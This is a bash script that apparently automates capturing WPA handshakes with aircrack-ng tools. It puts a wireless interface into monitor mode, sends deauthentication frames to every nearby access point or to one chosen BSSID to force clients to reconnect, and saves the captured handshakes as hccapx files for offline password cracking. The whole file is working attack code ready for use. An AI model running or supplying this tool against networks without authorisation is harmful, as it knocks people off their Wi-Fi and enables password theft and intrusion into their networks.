#!/bin/bash

interface=""
channel=""

checkUtils(){
        printf "Check utilities\n"
        
        #airmon-ng
        output=$(airmon-ng)
        if [[ "$output" == *"PHY"* ]]; then

                printf "airmon-ng....\033[32m Done\033[0m\n"
        else
                printf "airmon-ng....\033[31mFail\033[0m\n"
                exit 1
        fi

        #airodump-ng
        output=$(airodump-ng)
        if [[ "$output" == *"usage: airodump-ng"* ]]; then
                printf "airodump-ng....\033[32m Done\033[0m\n"
        else
                printf "airodump-ng....\033[31m Fail\033[0m\n"
                exit 1
        fi


        printf "\n"
}

checkHandshakes() {
        #trap 'cleanup' EXIT
        printf "\n"
        echo "Check handshakes..."
        cleanout=$(wpaclean ./hscollector/cleancap.cap ./hscollector/shakes-01.cap)
        echo $cleanout
        if [[ "$cleanout" == *"Net "* ]]; then
                output=$(cap2hccapx ./hscollector/cleancap.cap ./hscollector/cleanshakes.hccapx)
                echo $output
                if [[ "$output" != *"Written 0"* ]]; then
                        printf "\033[32mHandshakes detected!!!\033[0m\n"
                        time=$(date +%s)
                        filename="shake-$time"
                        if [[ -d ./hscollector/shakes ]]; then
                                mv ./hscollector/cleanshakes.hccapx ./hscollector/shakes/shake-$time
                        else
                                mkdir ./hscollector/shakes
                                chmod 777 -R ./hscollector/shakes
                                mv ./hscollector/cleanshakes.hccapx ./hscollector/shakes/shake-$time
                        fi
                        cleanup
                        exit 0
                 else
                        printf "\033[31mNo handshakes\033[0m\n"
                        rm ./hscollector/cleanshakes.hccapx >/dev/null
                 fi
        else 
                printf "\033[31mNo handshakes\033[0m\n"
                rm ./hscollector/cleanshakes.hccapx >/dev/null
        fi
        rm cleancap.cap > /dev/null
}

airodumpPID=""
passive() {
  trap 'cleanup;getparams' EXIT
  airmon-ng start $interface >/dev/null
  echo "Start airodump.."
  timeout 60 airodump-ng -w ./hscollector/shakes $interface </dev/null >/dev/null
  checkHandshakes
  rm ./hscollector/shakes-* > /dev/null
  passive
}

active() {
  trap 'cleanup;' EXIT
  echo "Collect APs..."
  timeout 10 airodump-ng -w ./hscollector/shakesCollector $interface </dev/null >/dev/null 
  while IFS=";" read -r id NetType ESSID BSSID Info Channel Cloaked Encryption Decrypted MaxRate MaxSeenRate Beacon LLC Data Crypt Weak Total Carrier Encoding FirstTime LastTime BestQuality BestSignal; do        
          if [[ $BSSID == "BSSID" ]];then
                  continue
          fi
          if [[ $id == "" ]]
          then
                  continue
          fi
          if [[ $BestQuality -lt -70 ]] || [[ $BestQuality -eq -1 ]]
          then
                  continue
          fi
            
          printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
          iwconfig $interface channel $Channel
          aireplay-ng -a $BSSID -0 10 $interface &
          airodump-ng --bssid $BSSID --channel $Channel -w ./hscollector/shakes $interface >/dev/null 2>&1 </dev/null &
          airodumpPID=`echo $!`
          sleep 30
          kill -9 $airodumpPID
          checkHandshakes
          rm ./hscollector/shakes-01.* >/dev/null
  done < <(tac ./hscollector/shakesCollector-01.kismet.csv)
  rm ./hscollector/shakes* &>/dev/null
  
}

attackSpecific(){
           trap 'cleanup;' EXIT
           airmon-ng start $interface >/dev/null
           BSSID_SEARCH=$1
           timeout 20 airodump-ng -w ./hscollector/shakesCollector $interface </dev/null >/dev/null 
           while IFS=";" read -r id NetType ESSID BSSID Info Channel Cloaked Encryption Decrypted MaxRate MaxSeenRate Beacon LLC Data Crypt Weak Total Carrier Encoding FirstTime LastTime BestQuality BestSignal; do        
                  if [[ $BSSID == "BSSID" ]];then
                          continue
                  fi
                  
                  if [[ $BSSID == $BSSID_SEARCH ]]
                  then
                          printf "\033[32mFind this AP\033[0m\n"
                          printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
                          iwconfig $interface channel $Channel
                          aireplay-ng -a $BSSID -0 10 $interface &
                          airodump-ng --bssid $BSSID --channel $Channel -w ./hscollector/shakes $interface 1>/dev/null 2>/dev/null 3>/dev/null &
                          airodumpPID=`echo $!`
                          sleep 30
                          echo "airodumpPID:"$airodumpPID
                          kill -9 $airodumpPID
                          checkHandshakes
                          break
                  else
                        continue
                  fi                 
                  printf "\033[31mNo this AP\033[0m\n"

            done < ./hscollector/shakesCollector-01.kismet.csv
            cleanup
            #rm ./hscollector/shakesCollector* &>/dev/null
            #rm ./hscollector/shakes* &>/dev/null
            attackSpecific $1
}

cleanup(){
        kill -9 $airodumpPID
        rm cleancap.cap

        rm ./hscollector/shakes* &> /dev/null
        rm ./hscollector/cleanshakes.hccapx &> /dev/null
}

#trap 'cleanup;exit 0' SIGINT SIGTERM ERR EXIT

if [[ "$(whoami)" != root ]]; then
  echo "Only user root can run this script."
  exit 1
fi

main(){
        checkUtils
        mkdir -p hscollector
        cleanup
}




if [[ $1 != "" ]] && [[ $2 != "" ]];then
                interface=$1
                checkUtils
                mkdir -p hscollector
                cleanup
                airmon-ng start $interface >/dev/null

                if [[ $2 == "a" ]];then
                        active
                fi
                if [[ $2 == "p" ]];then
                        passive

                fi
                if [[ $2 == "s" ]];then
                        if [[ $3 == "" ]];then
                                channel=$4
                                echo "Enter BSSID of AP"
                                exit 1
                        fi
                        attackSpecific $3 $channel
                fi
                
                exit 0

fi
main 
